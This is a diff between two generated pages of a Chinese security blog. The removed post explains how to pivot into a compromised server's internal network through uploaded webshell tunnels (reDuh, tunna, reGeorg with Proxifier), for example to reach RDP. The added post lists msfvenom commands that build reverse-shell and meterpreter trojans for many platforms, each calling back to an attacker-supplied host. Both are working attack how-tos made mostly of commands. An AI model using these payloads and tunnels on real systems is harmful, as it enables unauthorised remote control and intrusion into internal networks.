@@ -70,7 +70,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="端口转发,代理," />
+  <meta name="keywords" content="metasploit,msfvenom," />
 
 
 
@@ -87,25 +87,17 @@
 
 
 <meta name="description" content="如题">
-<meta name="keywords" content="端口转发,代理">
+<meta name="keywords" content="metasploit,msfvenom">
 <meta property="og:type" content="article">
-<meta property="og:title" content="脚本代理工具使用总结">
-<meta property="og:url" content="http://maplege.github.io/2017/09/13/scriptProxy/index.html">
+<meta property="og:title" content="msfvenom的常用命令">
+<meta property="og:url" content="http://maplege.github.io/2017/09/13/msfvenom/index.html">
 <meta property="og:site_name" content="MapleGe">
 <meta property="og:description" content="如题">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/HIijf2LbKF.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/GL4LajH4EK.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/2mE02AlK2C.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/7heDh30Ei6.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/KlkkDKFg5g.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/93gjFELhG3.png?imageslim">
-<meta property="og:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/AKEFHfDmkj.png?imageslim">
-<meta property="og:updated_time" content="2017-09-13T13:58:36.969Z">
+<meta property="og:updated_time" content="2017-09-13T14:20:01.237Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="脚本代理工具使用总结">
+<meta name="twitter:title" content="msfvenom的常用命令">
 <meta name="twitter:description" content="如题">
-<meta name="twitter:image" content="http://ovfjabb4f.bkt.clouddn.com/images/170913/HIijf2LbKF.png?imageslim">
 
 
 
@@ -135,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://maplege.github.io/2017/09/13/scriptProxy/"/>
+  <link rel="canonical" href="http://maplege.github.io/2017/09/13/msfvenom/"/>
 
 
 
 
 
-  <title>脚本代理工具使用总结 | MapleGe</title>
+  <title>msfvenom的常用命令 | MapleGe</title>
   
 
 
@@ -312,7 +304,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/09/13/scriptProxy/">
+    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/09/13/msfvenom/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="暮沉沉">
@@ -329,7 +321,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">脚本代理工具使用总结</h1>
+          <h1 class="post-title" itemprop="name headline">msfvenom的常用命令</h1>
         
 
         <div class="post-meta">
@@ -341,7 +333,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T21:50:27+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T22:18:27+08:00">
                 2017-09-13
               </time>
             
@@ -364,8 +356,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/端口转发/" itemprop="url" rel="index">
-                    <span itemprop="name">端口转发</span>
+                  <a href="/categories/metasploit/" itemprop="url" rel="index">
+                    <span itemprop="name">metasploit</span>
                   </a>
                 </span>
 
@@ -396,7 +388,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  804
+                  580
                 </span>
               
 
@@ -434,28 +426,10 @@
 
       
         <p>如题<br><a id="more"></a></p>
-<h1 id="脚本代理工具使用总结"><a href="#脚本代理工具使用总结" class="headerlink" title="脚本代理工具使用总结"></a>脚本代理工具使用总结</h1><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>正向代理和反向代理</p>
-<p>正向：我们发起请求，连接远程目标</p>
-<p>反向：远程目标发起请求，绕过防火墙，连接我们的攻击机（需要有公网IP、端口）</p>
-<h2 id="web脚本工具："><a href="#web脚本工具：" class="headerlink" title="web脚本工具："></a>web脚本工具：</h2><h3 id="reDuh（鼻祖，不太好用）"><a href="#reDuh（鼻祖，不太好用）" class="headerlink" title="reDuh（鼻祖，不太好用）"></a>reDuh（鼻祖，不太好用）</h3><p>使用方法：</p>
-<p>内有客户端和服务端两个版本。先将服务端的文件上传到服务器上，尝试访问并记录链接。<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/HIijf2LbKF.png?imageslim" alt="mark"><br>访问链接如上图则表明成功。然后打开客户端，将记录的链接放入，写入进行转发的端口号和要连接的目标机的IP（此时认为自己站在服务器上，如果输入127.0.0.1，则是连接服务器的某个端口），先点击start，然后点击Create。会将端口映射到自己电脑的指定端口。然后使用相应的程序连接自己本地的端口即可<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/GL4LajH4EK.png?imageslim" alt="mark"></p>
-<h3 id="tunna（不太好用）"><a href="#tunna（不太好用）" class="headerlink" title="tunna（不太好用）"></a>tunna（不太好用）</h3><p>使用方法：</p>
-<p>将webshells中的conn文件上传到服务器，访问文件如果是一片空格则证明成功了。</p>
-<p>攻击机使用命令：</p>
-<p>python proxy.py -u 连接网址 -l 本地端口 -r 目标端口 -a 127.0.0.1    </p>
-<p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python proxy.py -u http://192.168.20.54/uploads/scanGE/conn.php -l 2222 -r 3389 -a 192.168.5.136</div></pre></td></tr></table></figure></p>
-<p>则连接本地的2222相当于连接内网192.168.5.136的3389<br>如果此时映射3389（假设对方不允许远程登录），则也可以成功连接。</p>
-<p>如果只监听自己的2222，不指定对方端口，则需要配合代理软件（例如shadowsocks需要使用firefox的代理来配合）<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/2mE02AlK2C.png?imageslim" alt="mark"></p>
-<h3 id="reGeorg-proxifier（或sc32-exe）（目前最好用的）"><a href="#reGeorg-proxifier（或sc32-exe）（目前最好用的）" class="headerlink" title="reGeorg+proxifier（或sc32.exe）（目前最好用的）"></a>reGeorg+proxifier（或sc32.exe）（目前最好用的）</h3><p><strong>原理：</strong></p>
-<p>Proxifier可以让指定程序的流量全部走指定的端口，而reGeorgSocksProxy脚本可以将服务器映射到本地监听端口，则所有通过本地监听端口的流量就相当于是走了服务器，所以可以访问到服务器内网</p>
-<p><strong>使用方法：</strong></p>
-<p>将tunnel文件上传的服务器，访问文件网址，出现下图则证明成功<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/7heDh30Ei6.png?imageslim" alt="mark"><br>攻击机上执行：    python reGeorgSocksProxy    -u 木马网址 -p 本地监听端口    </p>
-<p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -u    http://192.168.20.54/uploads/scanGE/tunnel.php -p 1234</div></pre></td></tr></table></figure></p>
-<p><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/KlkkDKFg5g.png?imageslim" alt="mark"><br>使用Proxifier工具进行端口代理</p>
-<p>打开proxifier端口代理工具——》Profile——》proxy Servers</p>
-<p>添加一个  127.0.0.1 本地监听端口号   socket 5<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/93gjFELhG3.png?imageslim" alt="mark"><br>Proxifier——》Proxification Rules——》添加对应的程序（例如3389用mstsc）——》下面action选择刚刚添加的代理——》Target Ports  输入目标IP和端口（此时认为自己是服务器，如果是扫描器则不能输入IP和端口）——》打上对勾——》OK——》<br><img src="http://ovfjabb4f.bkt.clouddn.com/images/170913/AKEFHfDmkj.png?imageslim" alt="mark"><br>（如果不好用，可以指定端口和IP尝试一下）<br>此时再使用刚刚选择的程序，则那个程序全部走指定流量，例如使用mstsc，输入内网机IP（此时自己站在服务器的视角），即可成功连接</p>
-<p>也可以直接加载端口扫描器之类的进行内网扫描<br>不使用Proxifier，也可以使用sc32.exe进行端口代理<br>文件——》设置——》SOCKS设置——》SOCKS版本5——》确定<br>新建——》mstsc.exe——》运行</p>
-
+<h1 id="msfvenom的常用命令"><a href="#msfvenom的常用命令" class="headerlink" title="msfvenom的常用命令"></a>msfvenom的常用命令</h1><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>正向（bind_tcp）是我们连接肉鸡，反向（reverse_tcp）是肉鸡连接我们。<br>一般会使用反向payload，原因是正向连接会在肉鸡上开启一个端口，容易被发现。</p>
+<h3 id="Options"><a href="#Options" class="headerlink" title="Options:"></a>Options:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。</div><div class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</div><div class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</div><div class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</div><div class="line">	-e, –encoder [encoder] 指定需要使用的encoder（编码器）</div><div class="line">	-a, –arch &lt; architecture&gt; 指定payload的目标架构</div><div class="line">	–platform &lt; platform&gt; 指定payload的目标平台</div><div class="line">	-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度</div><div class="line">	-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039;</div><div class="line">	-i, –iterations &lt; count&gt; 指定payload的编码次数</div><div class="line">	-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</div><div class="line">	-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板</div><div class="line">	-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">	–payload-options 列举payload的标准选项</div><div class="line">	-o, –out &lt; path&gt; 保存payload</div><div class="line">	-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</div><div class="line">	–shellest 最小化生成payload</div><div class="line">	-h, –help 查看帮助选项</div><div class="line">	–help-formats 查看msf支持的输出格式列表</div></pre></td></tr></table></figure>
+<h3 id="不同系统下生成木马的命令"><a href="#不同系统下生成木马的命令" class="headerlink" title="不同系统下生成木马的命令"></a>不同系统下生成木马的命令</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">Linux</div><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</div><div class="line"></div><div class="line">Windows</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div><div class="line"></div><div class="line">Mac</div><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb Payloads</div><div class="line"></div><div class="line">PHP</div><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php（测试未成功）</div><div class="line"></div><div class="line">ASP</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div><div class="line"></div><div class="line">JSP</div><div class="line"></div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div><div class="line"></div><div class="line">WAR</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div><div class="line">Scripting Payloads</div><div class="line"></div><div class="line">Python</div><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div><div class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div><div class="line"></div><div class="line">Bash</div><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div><div class="line"></div><div class="line">Perl</div><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
+</code></pre>
       
     </div>
     
@@ -465,37 +439,6 @@
 	
 	  <div>
 	     
-<div class="my_post_copyright">
-  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
-    
-    <!-- JS库 sweetalert 可修改路径 -->
-	  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
-	    <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
-		  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-		    <p><span>本文标题:</span><a href="/2017/09/13/scriptProxy/">脚本代理工具使用总结</a></p>
-			  <p><span>文章作者:</span><a href="/" title="访问 暮沉沉 的个人博客">暮沉沉</a></p>
-			    <p><span>发布时间:</span>2017年09月13日 - 21:09</p>
-				  <p><span>最后更新:</span>2017年09月13日 - 21:09</p>
-				    <p><span>原始链接:</span><a href="/2017/09/13/scriptProxy/" title="脚本代理工具使用总结">http://maplege.github.io/2017/09/13/scriptProxy/</a>
-					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2017/09/13/scriptProxy/"  aria-label="复制成功！"></i></span>
-						  </p>
-						    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
-							</div>
-							<script> 
-							    var clipboard = new Clipboard('.fa-clipboard');
-								    clipboard.on('success', $(function(){
-												      $(".fa-clipboard").click(function(){
-															          swal({   
-																			            title: "",   
-																						          text: '复制成功',   
-																								            html: false,
-																											          timer: 500,   
-																													            showConfirmButton: false
-																																        });
-																	        });
-													      }));  
-</script>
-
 
 	  </div>
 	
@@ -522,9 +465,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/端口转发/" rel="tag"><i class="fa fa-tag"></i> 端口转发</a>
+            <a href="/tags/metasploit/" rel="tag"><i class="fa fa-tag"></i> metasploit</a>
           
-            <a href="/tags/代理/" rel="tag"><i class="fa fa-tag"></i> 代理</a>
+            <a href="/tags/msfvenom/" rel="tag"><i class="fa fa-tag"></i> msfvenom</a>
           
         </div>
       
@@ -537,8 +480,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/13/ssocks/" rel="next" title="ssocks（RCSOCKS代理工具套装）">
-                <i class="fa fa-chevron-left"></i> ssocks（RCSOCKS代理工具套装）
+              <a href="/2017/09/13/scriptProxy/" rel="next" title="脚本代理工具使用总结">
+                <i class="fa fa-chevron-left"></i> 脚本代理工具使用总结
               </a>
             
           </div>
@@ -546,10 +489,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/13/msfvenom/" rel="prev" title="msfvenom的常用命令">
-                msfvenom的常用命令 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -699,7 +638,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本代理工具使用总结"><span class="nav-number">1.</span> <span class="nav-text">脚本代理工具使用总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#理论："><span class="nav-number">1.1.</span> <span class="nav-text">理论：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web脚本工具："><span class="nav-number">1.2.</span> <span class="nav-text">web脚本工具：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#reDuh（鼻祖，不太好用）"><span class="nav-number">1.2.1.</span> <span class="nav-text">reDuh（鼻祖，不太好用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tunna（不太好用）"><span class="nav-number">1.2.2.</span> <span class="nav-text">tunna（不太好用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reGeorg-proxifier（或sc32-exe）（目前最好用的）"><span class="nav-number">1.2.3.</span> <span class="nav-text">reGeorg+proxifier（或sc32.exe）（目前最好用的）</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#msfvenom的常用命令"><span class="nav-number">1.</span> <span class="nav-text">msfvenom的常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#msfvenom"><span class="nav-number">1.1.</span> <span class="nav-text">msfvenom</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Options"><span class="nav-number">1.1.1.</span> <span class="nav-text">Options:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#不同系统下生成木马的命令"><span class="nav-number">1.1.2.</span> <span class="nav-text">不同系统下生成木马的命令</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
